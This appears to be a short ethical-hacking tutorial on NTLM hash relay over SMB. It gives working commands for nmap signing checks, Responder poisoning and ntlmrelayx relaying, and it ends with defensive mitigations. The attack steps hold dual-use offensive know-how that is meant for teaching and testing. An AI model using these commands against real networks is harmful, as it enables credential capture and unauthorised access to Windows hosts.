Sometimes, we're unable to crack the hashes that we recovered. In that case, we can just relay those hashes to specific machines and potentially gain access.<br><br>
There are a specific set of requirements we must meet for this to work:
- SMB Signing must be DISABLED on the target.
- Relayed user credentials must preferrably be ADMIN.

## Exploitation
Assuming SMB Signing has been disabled on the target, start with a confirmation scan:
```bash
nmap -script=smb2-security-mode.nse -p 445 TARGET-IP
```
![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/a0d110ff-bdaf-4138-9f7e-34a53287aa2e)

In order to relay the hashes, we'll need to edit the configuration file [responder.conf] with SMB to 'Off' and HTTP to 'Off'.<br>

![image](https://github.com/0xScorpio/Ethical-Hacking/assets/140411254/3b219178-b593-4ff4-9b6b-1caa42e92768)


Then proceed with listening for events:
```bash
sudo responder -I eth0 -dPv
```
As well as, set up a relay:
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```
> [!NOTE]
You can also add the following flags: 
> - i for interactive mode (if you're using this mode, create a listener on the specified port)
> - c for executing commands

## Mitigation
- Enable SMB signing on all devices (bare in mind, this can cause performance issues with file copies especially on legacy systems)
- Disable NTLMv1 authentication on network (If Kerberos stops working, Windows defaults back to NTLMv1)
- Account Tiering (Check AD Tier Modeling)
- Local admin restriction (Use LAPS to save yourself from the amount of potential increase in service desk tickets)
